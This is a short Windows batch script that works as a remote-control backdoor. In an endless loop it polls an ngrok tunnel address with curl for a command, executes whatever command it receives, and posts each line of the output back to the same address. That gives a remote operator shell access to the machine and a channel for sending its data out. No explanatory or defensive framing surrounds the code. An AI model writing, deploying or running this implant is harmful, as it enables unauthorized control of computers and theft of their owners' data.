@echo off
set URL=https://indecipherable-esther-azonic.ngrok-free.dev

:loop
    rem Wait 0.5 seconds (approx) using ping trick
    ping -n 1 127.0.0.1 >nul

    rem Get command from server
    for /f "usebackq delims=" %%A in (`curl -s %URL%`) do set CMD=%%A

    if "%CMD%"=="" goto loop

    rem Execute command and capture output
    for /f "delims=" %%O in ('%CMD% 2^>^&1') do (
        curl -X POST -d "%%O" %URL%
    )

    goto loop
